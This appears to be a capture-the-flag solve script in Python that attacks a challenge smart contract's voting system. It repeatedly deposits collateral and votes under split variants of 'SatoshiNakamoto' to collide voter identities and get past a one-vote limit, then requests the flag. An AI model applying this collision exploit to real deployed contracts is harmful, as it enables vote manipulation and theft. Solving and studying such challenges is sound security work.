#!/usr/bin/env python3

import sys
import re
import subprocess
import socket

def interact_with_info_server(ip, port_info, payload):
    """
    Connects to the info server, sends the menu selection payload, and reads the response.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, int(port_info)))
    
    # Read initial banner until prompt
    response = b""
    while b"action?" not in response:
        try:
            sock.settimeout(2.0)
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
            
    # Send action choice payload
    sock.sendall(payload.encode())
    
    # Read server output response
    response = ""
    while True:
        try:
            sock.settimeout(3.0)
            chunk = sock.recv(4096).decode('utf-8', errors='ignore')
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
            
    sock.close()
    return response

def fetch_connection_info(ip, port_info):
    """
    Sends option '1' to extract private key and target contract address.
    """
    print(f"[*] Connecting to info endpoint {ip}:{port_info}...")
    response = interact_with_info_server(ip, port_info, "1\n")
    print(response)
    
    pk_match = re.search(r"Private key\s*:\s*(0x[a-fA-F0-9]+)", response)
    target_match = re.search(r"Target contract\s*:\s*(0x[a-fA-F0-9]+)", response)
    
    if not (pk_match and target_match):
        raise ValueError("[-] Failed to extract Private Key or Target Contract from server response!")
        
    return pk_match.group(1), target_match.group(1)

def cast_send(target, rpc_url, private_key, signature, *args):
    """
    Executes Foundry's 'cast send' command via subprocess.
    """
    cmd = [
        "cast", "send",
        target,
        signature
    ]
    cmd.extend([str(arg) for arg in args])
    cmd.extend([
        "--rpc-url", rpc_url,
        "--private-key", private_key
    ])
    
    print(f"[*] Running: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print("[+] Transaction Success:\n", result.stdout.strip())
    except subprocess.CalledProcessError as e:
        print("[-] Transaction Failed:\n", e.stderr.strip())

def request_flag(ip, port_info):
    """
    Sends option '3' to retrieve the flag from the info server.
    """
    print("\n[+] All votes deployed. Requesting flag from info server...")
    response = interact_with_info_server(ip, port_info, "3\n")
    print("\n=== SERVER RESPONSE ===")
    print(response)
    print("=======================")

def main():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <ip> <port_info> <port_rpc>")
        sys.exit(1)
        
    ip = sys.argv[1]
    port_info = sys.argv[2]
    port_rpc = sys.argv[3]
    
    # Step 1: Retrieve deployment configuration from info server
    try:
        private_key, target_contract = fetch_connection_info(ip, port_info)
    except Exception as error:
        print(f"[-] Error fetching connection info: {error}")
        sys.exit(1)
        
    rpc_url = f"http://{ip}:{port_rpc}"
    print(f"[+] Target Contract : {target_contract}")
    print(f"[+] RPC Endpoint    : {rpc_url}")
    
    # Step 2: Execute voter attack loop
    voter_base = "SatoshiNakamoto"
    vote_payload_bytes = "0x" + b"CIM".hex()
    
    for i in range(1, 12):
        name = voter_base[:i]
        surname = voter_base[i:]
        
        if not name == "Satoshi" and not surname == "Nakamoto":
            print(f"\n[*] Attacking with voter: {name} {surname}")
            
            # Deposit collateral
            cast_send(target_contract, rpc_url, private_key, "depositVoteCollateral(string,string)", name, surname)
            
            # Cast vote
            cast_send(target_contract, rpc_url, private_key, "vote(bytes3,string,string)", vote_payload_bytes, name, surname)

    # Step 3: Retrieve the flag
    try:
        request_flag(ip, port_info)
    except Exception as error:
        print(f"[-] Error retrieving flag: {error}")

if __name__ == "__main__":
    main()